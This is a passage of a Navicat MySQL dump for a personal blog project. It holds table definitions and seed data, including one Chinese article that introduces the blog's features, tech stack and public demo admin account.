/*
 Navicat Premium Data Transfer

 Source Server         : mysql5.7
 Source Server Type    : MySQL
 Source Server Version : 50729
 Source Host           : localhost:3366
 Source Schema         : pblog

 Target Server Type    : MySQL
 Target Server Version : 50729
 File Encoding         : 65001

 Date: 20/04/2023 23:18:28
*/

SET NAMES utf8mb4;
SET FOREIGN_KEY_CHECKS = 0;

-- ----------------------------
-- Table structure for b_admin_log
-- ----------------------------
DROP TABLE IF EXISTS `b_admin_log`;
CREATE TABLE `b_admin_log`  (
  `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '主键ID',
  `username` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '操作用户',
  `request_url` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '请求接口',
  `type` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '请求方式',
  `operation_name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '操作名称',
  `ip` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT 'ip',
  `source` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT 'ip来源',
  `spend_time` bigint(20) NULL DEFAULT NULL COMMENT '请求接口耗时',
  `create_time` datetime NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `params_json` mediumtext CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL COMMENT '请求参数',
  `class_path` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '类地址',
  `method_name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '方法名',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of b_admin_log
-- ----------------------------

-- ----------------------------
-- Table structure for b_article
-- ----------------------------
DROP TABLE IF EXISTS `b_article`;
CREATE TABLE `b_article`  (
  `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '主键id',
  `user_id` bigint(20) NULL DEFAULT NULL COMMENT '用户id',
  `category_id` bigint(20) NULL DEFAULT NULL COMMENT '分类id',
  `title` varchar(150) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL DEFAULT '' COMMENT '文章标题',
  `avatar` varchar(200) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '文章封面地址',
  `summary` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL DEFAULT '' COMMENT '文章简介',
  `content` mediumtext CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL COMMENT '文章内容 （最多两百字）',
  `content_md` mediumtext CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL COMMENT '文章内容md版',
  `is_secret` int(2) NULL DEFAULT 0 COMMENT '是否是私密文章 0 否 1是',
  `is_stick` int(2) NULL DEFAULT 0 COMMENT '是否置顶 0否 1是',
  `is_publish` int(10) NULL DEFAULT 0 COMMENT '是否发布 0：下架 1：发布',
  `is_original` int(10) NULL DEFAULT NULL COMMENT '是否原创  0：转载 1:原创',
  `original_url` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '转载地址',
  `quantity` bigint(6) NULL DEFAULT 0 COMMENT '文章阅读量',
  `remark` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT '' COMMENT '说明',
  `create_time` datetime NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `keywords` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT 'seo关键词',
  `update_time` datetime NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '修改时间',
  PRIMARY KEY (`id`) USING BTREE,
  INDEX `b_article_ibfk_1`(`category_id`) USING BTREE,
  CONSTRAINT `b_article_ibfk_1` FOREIGN KEY (`category_id`) REFERENCES `b_category` (`id`) ON DELETE NO ACTION ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 2 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '博客文章表' ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of b_article
-- ----------------------------
INSERT INTO `b_article` VALUES (1, 1, 1, '关于博客', 'http://img.codescholar.cn/176a0cf1e7e74ea1bb63508371a58e8a.png', '聊一聊为什么我要开发这个博客，它有哪些功能', '<h2><a id=\"_0\"></a>聊聊初心</h2>\n<p>上一个博客项目，是在20年，使用的技术框架是springboot+Thymeleaf+semantic-ui，图床技术使用的是gitee的免费图床。</p>\n<p>结果到了现在semantic-ui不怎么更新维护，导致我的样式经常加载不出来。</p>\n<p>gitee图床图片全部失效，没有办法我只能使用七牛云重新再搭建一个。</p>\n<p>我还想再去添加一些功能，比如面试题的功能模块，为了方便背题，特意优化了对移动端的适配。</p>\n<p>由于我对于知识的记忆，从来不是记忆具体的内容，多数习惯于记住于知识的位置，所以我对于好多的知识点都是知道个大概，但是具体的内容，就只能到用的时候去找对应的记录点。</p>\n<p>其实就是比较懒，不喜欢刻意记忆太多的东西。只要我能随时找到它在哪，我就永远不会记住它的内容。所以我必须有个博客存储自己需要的知识，随时随地的添加和查看。它可以替代我大脑的一部分功能。</p>\n<p>为了能有练手的效果，我使用了前后端分离模式的开发，用上当前较为流行的技术。</p>\n<h2><a id=\"1_16\"></a>1、博客使用到的技术</h2>\n<ol>\n<li>后端：springboot，mysql，redis， es搜索引擎（目前内容较少，服务器性能太差没有启用）</li>\n<li>前端：vue，webpack和compression-webpack-plugin插件打包，优化网站的响应速度。</li>\n</ol>\n<h2><a id=\"2_21\"></a>2、首页登录</h2>\n<p>支持登录功能，可以进行文章的评论，留言等互动功能，但是不是主要功能，采用邮箱进行登录。</p>\n<p>也支持<a href=\"https://connect.qq.com/index.html\" target=\"_blank\">QQ</a>、<a href=\"https://gitee.com/api/v5/oauth_doc#/\" target=\"_blank\">gitee</a>、<a href=\"https://open.weibo.com/?bottomnav=1&amp;wvr=6\" target=\"_blank\">微博</a>登录，但目前我没有开放。</p>\n<h2><a id=\"3_26\"></a>3、图片的存储</h2>\n<p>gitee目前不能使用，导致我以前的图片全部不能外链出来，文章中的链接需要重新修改，平白无故的工作量。</p>\n<p>果然免费的就是最贵的，但是白嫖还是挺香的。</p>\n<p>项目中图片存储采用的是<a href=\"https://www.qiniu.com/products/kodo\" target=\"_blank\">七牛云</a>平台的对象存储，因为只有七牛云每个月会有免费的一个额度，其他的都是需要收费的。</p>\n<p>如果后面不够用，价格也是相对便宜的。</p>\n<h2><a id=\"4__35\"></a>4、 面试题功能</h2>\n<p>我在博客中加入的面试题功能，目前比较单薄，仅支持分类查看和搜索，对于难易程度、标签的掌控并不好，比较适合去背八股文。</p>\n<p>为了背题方便，我特意优化了在移动端的显示。</p>\n<p>左边为分类选择，右面为该分类下的问题列表。</p>\n<p><img src=\"http://img.codescholar.cn/webconfig/202304202120657.png\" alt=\"image-20230420202434122\" /></p>\n<p>移动端显示，中间选择问题分类，悬浮按钮打开问题目录。</p>\n<table>\n<thead>\n<tr>\n<th><img src=\"http://img.codescholar.cn/webconfig/202304202120759.png\" alt=\"image-20230420202621707\" width=\"400\" /></th>\n<th><img src=\"http://img.codescholar.cn/webconfig/202304202121616.png\" alt=\"image-20230420202819318\" width=\"400\" /></th>\n</tr>\n</thead>\n<tbody></tbody>\n</table>\n<h2><a id=\"5_51\"></a>5、首页的搜索</h2>\n<p>首页的搜索分为文章搜索和面试题搜索，由于内容较少（穷，服务器垃圾），无法使用ELK技术栈。</p>\n<p>当然各位看官都是不差这点小钱的人，可以开发此功能，这部分功能的后端我没有进行完善。</p>\n<p>项目搜索的话主要是围绕文章的标题和内容进行的分词搜索。</p>\n<h2><a id=\"6__61\"></a>6. 后台管理</h2>\n<blockquote>\n<p><a href=\"http://www.codescholar.cn//admin\" target=\"_blank\">后台地址</a><br />\n演示账号：test, 密码：123456</p>\n</blockquote>\n<h3><a id=\"1_64\"></a>1、登录界面</h3>\n<p><img src=\"http://img.codescholar.cn/webconfig/202304202121570.png\" alt=\"image-20230420203805222\" /></p>\n<p>由于眼睛和脑子不好，为了少输入写验证码，或者计算，或者识别文字的，使用的是图片滑块验证。</p>\n<p><img src=\"http://img.codescholar.cn/webconfig/202304202121496.png\" alt=\"image-20230420203954502\" /></p>\n<h3><a id=\"2_71\"></a>2、后台首页</h3>\n<p>一些统计信息</p>\n<p><img src=\"http://img.codescholar.cn/webconfig/202304202121816.png\" alt=\"image-20230420204515728\" /></p>\n<p>表盘显示</p>\n<p><img src=\"http://img.codescholar.cn/webconfig/202304202121686.png\" alt=\"image-20230420204612477\" /></p>\n<h3><a id=\"3_81\"></a>3、文章管理</h3>\n<p>一些小功能，可以直接从CSDN抓取文章，但是还需要你修改一部分显示样式。</p>\n<p>SEO是将文章推给百度资源进行收录，提高百度搜索排名。</p>\n<p><img src=\"http://img.codescholar.cn/webconfig/202304202121645.png\" alt=\"image-20230420204812627\" /></p>\n<p>编辑器使用的是mavon-editor编辑器，<a href=\"http://www.mavoneditor.com/\" target=\"_blank\">mavonEditor|码文 在线markdown编辑器</a></p>\n<p><img src=\"http://img.codescholar.cn/webconfig/202304202121755.png\" alt=\"image-20230420205217223\" /></p>\n<h3><a id=\"4_92\"></a>4、网站管理</h3>\n<p>可以修改前台的一些显示信息，头像，介绍，个人信息，前台页面背景图，友链等</p>\n<p><img src=\"http://img.codescholar.cn/webconfig/202304202121310.png\" alt=\"image-20230420205632142\" /></p>\n<h3><a id=\"5_97\"></a>5、面试题管理</h3>\n<p>管理面试题和分类的内容，还是比较方便的。</p>\n<p><img src=\"http://img.codescholar.cn/webconfig/202304202121630.png\" alt=\"image-20230420205921381\" /></p>\n<h3><a id=\"6_103\"></a>6、系统管理</h3>\n<p>一些功能的是否启用，还有文件存储方式，配置信息，用户信息进行管理</p>\n<p><img src=\"http://img.codescholar.cn/webconfig/202304202121275.png\" alt=\"image-20230420210110423\" /></p>\n<h3><a id=\"7_108\"></a>7、监控中心</h3>\n<ol>\n<li>监控中心主要有服务器的监控和定时任务，定时任务支持自动添加修改删除功能，改了时间无需修改代码</li>\n</ol>\n<p><img src=\"http://img.codescholar.cn/webconfig/202304202121713.png\" alt=\"image-20230420210330871\" /></p>\n<h3><a id=\"8_113\"></a>8、日志管理</h3>\n<p>记录网站的操作信息，方便对网站进行维护</p>\n<p><img src=\"http://img.codescholar.cn/webconfig/202304202121306.png\" alt=\"image-20230420210456695\" /></p>\n<h3><a id=\"_119\"></a>结尾</h3>\n<p>这里只是给大家进行了一部分的功能介绍，我放了演示账号，大家随时可以进入后台查看。</p>\n<p>后面我还会添加一些好玩实用的功能，使它更加的完善，虽然已经很完善了。</p>\n<p>目前是根据我的使用习惯，来打造的这个博客，有些功能大家需要开发可以给我留言，当然也可以有大佬直接对这个项目进行Fork。</p>\n<p>这个项目当然不可能是我从头到尾写的，这里@一下原作者，https://gitee.com/quequnlong/shiyi-blog。</p>\n<p>对于好的开源技术，我是不吝借鉴的，毕竟读书人的事怎么能说偷呢？站在前人的肩膀上才是明智之选。</p>\n<p>项目我已经开源到Gitee和GitHub，有需要的同志可以自取，当然也别忘了给个star。</p>\n<blockquote>\n<p>码云地址：<a href=\"https://gitee.com/chengxuru/rulin-blog\" target=\"_blank\">点我进入</a></p>\n</blockquote>\n<h2><a id=\"bye_137\"></a>bye</h2>\n', '## 聊聊初心\n\n上一个博客项目，是在20年，使用的技术框架是springboot+Thymeleaf+semantic-ui，图床技术使用的是gitee的免费图床。\n\n结果到了现在semantic-ui不怎么更新维护，导致我的样式经常加载不出来。\n\ngitee图床图片全部失效，没有办法我只能使用七牛云重新再搭建一个。\n\n我还想再去添加一些功能，比如面试题的功能模块，为了方便背题，特意优化了对移动端的适配。\n\n由于我对于知识的记忆，从来不是记忆具体的内容，多数习惯于记住于知识的位置，所以我对于好多的知识点都是知道个大概，但是具体的内容，就只能到用的时候去找对应的记录点。\n\n其实就是比较懒，不喜欢刻意记忆太多的东西。只要我能随时找到它在哪，我就永远不会记住它的内容。所以我必须有个博客存储自己需要的知识，随时随地的添加和查看。它可以替代我大脑的一部分功能。\n\n为了能有练手的效果，我使用了前后端分离模式的开发，用上当前较为流行的技术。\n\n## 1、博客使用到的技术\n\n1. 后端：springboot，mysql，redis， es搜索引擎（目前内容较少，服务器性能太差没有启用）\n2. 前端：vue，webpack和compression-webpack-plugin插件打包，优化网站的响应速度。\n\n## 2、首页登录\n支持登录功能，可以进行文章的评论，留言等互动功能，但是不是主要功能，采用邮箱进行登录。\n\n也支持[QQ](https://connect.qq.com/index.html)、[gitee](https://gitee.com/api/v5/oauth_doc#/)、[微博](https://open.weibo.com/?bottomnav=1&wvr=6)登录，但目前我没有开放。\n\n## 3、图片的存储\ngitee目前不能使用，导致我以前的图片全部不能外链出来，文章中的链接需要重新修改，平白无故的工作量。\n\n果然免费的就是最贵的，但是白嫖还是挺香的。\n\n项目中图片存储采用的是[七牛云](https://www.qiniu.com/products/kodo)平台的对象存储，因为只有七牛云每个月会有免费的一个额度，其他的都是需要收费的。\n\n如果后面不够用，价格也是相对便宜的。\n\n## 4、 面试题功能\n\n我在博客中加入的面试题功能，目前比较单薄，仅支持分类查看和搜索，对于难易程度、标签的掌控并不好，比较适合去背八股文。\n\n为了背题方便，我特意优化了在移动端的显示。\n\n左边为分类选择，右面为该分类下的问题列表。\n\n![image-20230420202434122](http://img.codescholar.cn/webconfig/202304202120657.png)\n\n移动端显示，中间选择问题分类，悬浮按钮打开问题目录。\n\n<img src=\"http://img.codescholar.cn/webconfig/202304202120759.png\" alt=\"image-20230420202621707\" width=\"400\" />|<img src=\"http://img.codescholar.cn/webconfig/202304202121616.png\" alt=\"image-20230420202819318\" width=\"400\" />\n---|---\n\n\n## 5、首页的搜索\n\n首页的搜索分为文章搜索和面试题搜索，由于内容较少（穷，服务器垃圾），无法使用ELK技术栈。\n\n当然各位看官都是不差这点小钱的人，可以开发此功能，这部分功能的后端我没有进行完善。\n\n项目搜索的话主要是围绕文章的标题和内容进行的分词搜索。\n\n\n\n##  6. 后台管理\n> [后台地址](http://www.codescholar.cn//admin)\n> 演示账号：test, 密码：123456\n### 1、登录界面\n![image-20230420203805222](http://img.codescholar.cn/webconfig/202304202121570.png)\n\n由于眼睛和脑子不好，为了少输入写验证码，或者计算，或者识别文字的，使用的是图片滑块验证。\n\n![image-20230420203954502](http://img.codescholar.cn/webconfig/202304202121496.png)\n\n### 2、后台首页\n\n一些统计信息\n\n![image-20230420204515728](http://img.codescholar.cn/webconfig/202304202121816.png)\n\n表盘显示\n\n![image-20230420204612477](http://img.codescholar.cn/webconfig/202304202121686.png)\n\n### 3、文章管理\n一些小功能，可以直接从CSDN抓取文章，但是还需要你修改一部分显示样式。\n\nSEO是将文章推给百度资源进行收录，提高百度搜索排名。\n\n![image-20230420204812627](http://img.codescholar.cn/webconfig/202304202121645.png)\n\n编辑器使用的是mavon-editor编辑器，[mavonEditor|码文 在线markdown编辑器](http://www.mavoneditor.com/)\n\n![image-20230420205217223](http://img.codescholar.cn/webconfig/202304202121755.png)\n\n### 4、网站管理\n可以修改前台的一些显示信息，头像，介绍，个人信息，前台页面背景图，友链等\n\n![image-20230420205632142](http://img.codescholar.cn/webconfig/202304202121310.png)\n\n### 5、面试题管理\n\n管理面试题和分类的内容，还是比较方便的。\n\n![image-20230420205921381](http://img.codescholar.cn/webconfig/202304202121630.png)\n\n### 6、系统管理\n一些功能的是否启用，还有文件存储方式，配置信息，用户信息进行管理\n\n![image-20230420210110423](http://img.codescholar.cn/webconfig/202304202121275.png)\n\n### 7、监控中心\n1. 监控中心主要有服务器的监控和定时任务，定时任务支持自动添加修改删除功能，改了时间无需修改代码\n\n![image-20230420210330871](http://img.codescholar.cn/webconfig/202304202121713.png)\n\n### 8、日志管理\n\n记录网站的操作信息，方便对网站进行维护\n\n![image-20230420210456695](http://img.codescholar.cn/webconfig/202304202121306.png)\n\n### 结尾\n\n这里只是给大家进行了一部分的功能介绍，我放了演示账号，大家随时可以进入后台查看。\n\n后面我还会添加一些好玩实用的功能，使它更加的完善，虽然已经很完善了。\n\n目前是根据我的使用习惯，来打造的这个博客，有些功能大家需要开发可以给我留言，当然也可以有大佬直接对这个项目进行Fork。\n\n这个项目当然不可能是我从头到尾写的，这里@一下原作者，https://gitee.com/quequnlong/shiyi-blog。\n\n对于好的开源技术，我是不吝借鉴的，毕竟读书人的事怎么能说偷呢？站在前人的肩膀上才是明智之选。\n\n项目我已经开源到Gitee和GitHub，有需要的同志可以自取，当然也别忘了给个star。\n\n\n\n> 码云地址：[点我进入](https://gitee.com/chengxuru/rulin-blog)\n\n## bye', 0, 1, 1, 1, NULL, 1, '', '2023-04-20 22:38:08', '博客，儒林小栈', NULL);

-- ----------------------------
-- Table structure for b_article_tag
-- ----------------------------
DROP TABLE IF EXISTS `b_article_tag`;
CREATE TABLE `b_article_tag`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `article_id` int(11) NOT NULL COMMENT '文章id',
  `tag_id` int(11) NOT NULL COMMENT '标签id',
  PRIMARY KEY (`id`) USING BTREE,
  UNIQUE INDEX `fk_article_tag_1`(`article_id`, `tag_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 4 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of b_article_tag
-- ----------------------------
INSERT INTO `b_article_tag` VALUES (1, 1, 1);
INSERT INTO `b_article_tag` VALUES (2, 1, 3);
INSERT INTO `b_article_tag` VALUES (3, 1, 4);

-- ----------------------------
-- Table structure for b_category
-- ----------------------------
DROP TABLE IF EXISTS `b_category`;
CREATE TABLE `b_category`  (
  `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '主键id',
  `name` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL DEFAULT '' COMMENT '分类名称',
  `click_volume` int(10) NULL DEFAULT 0,
  `sort` int(11) NOT NULL COMMENT '排序',
  `create_time` datetime NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `update_time` datetime NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '最后更新时间',
  PRIMARY KEY (`id`) USING BTREE,
  INDEX `category_name`(`name`) USING BTREE COMMENT '博客分类名称'
) ENGINE = InnoDB AUTO_INCREMENT = 30 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '博客分类表' ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of b_category
-- ----------------------------
INSERT INTO `b_category` VALUES (1, '项目介绍', 0, 10, '2023-04-20 10:21:40', '2023-04-09 18:56:23');
INSERT INTO `b_category` VALUES (2, '生活随笔', 0, 4, '2023-04-20 10:22:09', '2023-04-20 10:23:40');
INSERT INTO `b_category` VALUES (3, '转载', 0, 3, '2023-04-20 10:41:45', '2023-04-20 22:51:47');
INSERT INTO `b_category` VALUES (4, '后端框架', 0, 9, '2023-04-20 14:00:49', '2023-04-20 10:23:18');
INSERT INTO `b_category` VALUES (5, '搜索框架', 0, 5, '2023-04-20 14:01:09', '2023-04-20 22:51:51');
INSERT INTO `b_category` VALUES (6, '爬虫', 0, 1, '2023-04-20 17:08:57', '2023-04-20 10:23:01');
INSERT INTO `b_category` VALUES (7, '小工具', 0, 7, '2023-04-20 15:05:58', '2023-04-20 17:46:18');
INSERT INTO `b_category` VALUES (8, '数据库', 0, 0, '2023-04-20 16:01:07', '2023-04-20 08:01:06');
INSERT INTO `b_category` VALUES (9, '测试', 0, 0, '2023-04-20 18:35:30', '2023-04-20 18:35:30');

-- ----------------------------
-- Table structure for b_comment
-- ----------------------------
DROP TABLE IF EXISTS `b_comment`;
CREATE TABLE `b_comment`  (
  `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT 'ID',
  `user_id` bigint(20) NOT NULL COMMENT '评论人ID',
  `article_id` bigint(20) NOT NULL COMMENT '文章id',
  `content` mediumtext CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '内容',
  `reply_user_id` bigint(20) NULL DEFAULT NULL COMMENT '回复人id',
  `parent_id` int(11) NULL DEFAULT NULL COMMENT '父id',
  `create_time` datetime NULL DEFAULT NULL ON UPDATE CURRENT_TIMESTAMP COMMENT '评论时间',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '评论表' ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of b_comment
-- ----------------------------

-- ----------------------------
-- Table structure for b_dict
-- ----------------------------
DROP TABLE IF EXISTS `b_dict`;
CREATE TABLE `b_dict`  (
  `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '主键',
  `name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '字典名称',
  `type` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '字典类型',
  `is_publish` varchar(10) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL DEFAULT '1' COMMENT '是否发布(1:是，0:否)',
  `remark` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '备注',
  `create_time` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `update_time` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '修改时间',
  `sort` int(11) NULL DEFAULT 0 COMMENT '排序',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 10 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '字典表' ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of b_dict
-- ----------------------------
INSERT INTO `b_dict` VALUES (1, '用户性别', 'sys_user_sex', '1', '用户性别', '2023-04-20 09:24:23', '2023-04-20 22:03:54', 0);
INSERT INTO `b_dict` VALUES (2, '发布状态', 'sys_publish_status', '1', '发布状态列表', '2023-04-20 17:12:51', '2023-04-20 17:12:51', 0);
INSERT INTO `b_dict` VALUES (3, '搜索模式', 'sys_search_model', '1', '搜索模式：SQL搜索、全文检索', '2023-04-20 08:57:47', '2023-04-20 08:57:47', 2);
INSERT INTO `b_dict` VALUES (4, '系统是否', 'sys_yes_no', '1', '系统是否列表', '2023-04-20 14:03:12', '2023-04-20 14:03:12', 2);
INSERT INTO `b_dict` VALUES (5, '系统开关', 'sys_normal_disable', '1', '系统开关列表', '2023-04-20 15:16:43', '2023-04-20 15:16:43', 3);
INSERT INTO `b_dict` VALUES (6, '博客登录方式', 'sys_login_method', '1', '博客登录方式 账号密码、QQ、微博', '2023-04-20 13:52:38', '2023-04-20 13:52:38', 0);
INSERT INTO `b_dict` VALUES (7, '定时任务分组', 'sys_job_group', '1', '定时任务分组列表', '2023-04-20 08:53:30', '2023-04-20 08:53:30', 2);
INSERT INTO `b_dict` VALUES (8, '任务状态', 'sys_job_status', '1', '任务状态列表', '2023-04-20 09:01:10', '2023-04-20 09:01:10', 2);
INSERT INTO `b_dict` VALUES (9, '任务执行策略', 'sys_job_misfire', '1', '任务执行策略列表', '2023-04-20 11:11:48', '2023-04-20 11:12:04', 2);

-- ----------------------------
-- Table structure for b_dict_data
-- ----------------------------
DROP TABLE IF EXISTS `b_dict_data`;
CREATE TABLE `b_dict_data`  (
  `id` bigint(10) NOT NULL AUTO_INCREMENT COMMENT '主键',
  `dict_id` bigint(10) NOT NULL COMMENT '字典类型id',
  `label` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '字典标签',
  `value` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '字典键值',
  `style` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '回显样式',
  `is_default` varchar(10) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '是否默认（1是 0否）',
  `sort` int(10) NULL DEFAULT NULL COMMENT '排序',
  `is_publish` varchar(10) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '是否发布(1:是，0:否)',
  `remark` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '备注',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 23 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of b_dict_data
-- ----------------------------
INSERT INTO `b_dict_data` VALUES (1, 2, '发布', '1', 'success', '1', 1, '1', NULL);
INSERT INTO `b_dict_data` VALUES (2, 2, '下架', '0', 'danger', '0', 0, '1', NULL);
INSERT INTO `b_dict_data` VALUES (3, 4, '是', '1', 'success', '1', 1, '1', '系统是否 是');
INSERT INTO `b_dict_data` VALUES (4, 4, '否', '0', 'warning', '0', 0, '1', '系统是否 否');
INSERT INTO `b_dict_data` VALUES (5, 5, '开启', '1', 'success', '1', 1, '1', '系统开关 开启');
INSERT INTO `b_dict_data` VALUES (6, 5, '关闭', '0', 'warning', '0', 2, '1', '系统开关 关闭');
INSERT INTO `b_dict_data` VALUES (7, 3, 'ES搜索', '1', 'success', '0', 1, '1', '搜索模式：开启ElasticSearch全文检索');
INSERT INTO `b_dict_data` VALUES (8, 3, 'SQL搜索', '0', 'warning', '1', 2, '1', '搜索模式：SQL搜索');
INSERT INTO `b_dict_data` VALUES (9, 6, '邮箱', '1', 'primary', '0', 1, '1', '邮箱账号密码登录');
INSERT INTO `b_dict_data` VALUES (10, 6, 'QQ', '2', 'success', '1', 2, '1', 'QQ登录');
INSERT INTO `b_dict_data` VALUES (11, 6, '微博', '3', 'danger', '0', 3, '1', '微博登录');
INSERT INTO `b_dict_data` VALUES (12, 1, '男', '1', '', '1', 1, '1', '性别 男');
INSERT INTO `b_dict_data` VALUES (13, 1, '女', '0', '', '1', 0, '1', '性别 女');
INSERT INTO `b_dict_data` VALUES (14, 7, '默认', 'DEFAULT', 'primary', '1', 1, '1', '默认分组');
INSERT INTO `b_dict_data` VALUES (15, 7, '系统', 'SYSTEM', 'warning', '0', 2, '1', '系统分组');
INSERT INTO `b_dict_data` VALUES (16, 8, '正常', '0', 'primary', '0', 1, '1', '正常状态');
INSERT INTO `b_dict_data` VALUES (17, 8, '暂停', '1', 'danger', '1', 2, '1', '暂停状态');
INSERT INTO `b_dict_data` VALUES (18, 9, '默认策略', '0', '', '1', 1, '1', '默认策略');
INSERT INTO `b_dict_data` VALUES (19, 9, '立即执行', '1', '', '0', 2, '1', '立即执行');
INSERT INTO `b_dict_data` VALUES (20, 9, '执行一次', '2', '', '0', 3, '1', '执行一次');
INSERT INTO `b_dict_data` VALUES (21, 9, '放弃执行', '3', '', '0', 4, '1', '放弃执行');
INSERT INTO `b_dict_data` VALUES (22, 6, '码云', '4', 'danger', '0', 4, '1', 'gitee登录');

-- ----------------------------
-- Table structure for b_exception_log
-- ----------------------------
DROP TABLE IF EXISTS `b_exception_log`;
CREATE TABLE `b_exception_log`  (
  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT '主键',
  `username` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '用户名',
  `ip` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT 'IP',
  `ip_source` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT 'ip来源',
  `method` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '请求方法',
  `operation` mediumtext CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL COMMENT '描述',
  `params` mediumtext CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL COMMENT '参数',
  `exception_json` mediumtext CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL COMMENT '异常对象json格式',
  `exception_message` mediumtext CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL COMMENT '异常简单信息,等同于e.getMessage',
  `create_time` datetime NULL DEFAULT CURRENT_TIMESTAMP COMMENT '发生时间',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of b_exception_log
-- ----------------------------

-- ----------------------------
-- Table structure for b_feed_back
-- ----------------------------
DROP TABLE IF EXISTS `b_feed_back`;
CREATE TABLE `b_feed_back`  (
  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT 'ID',
  `email` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '邮箱',
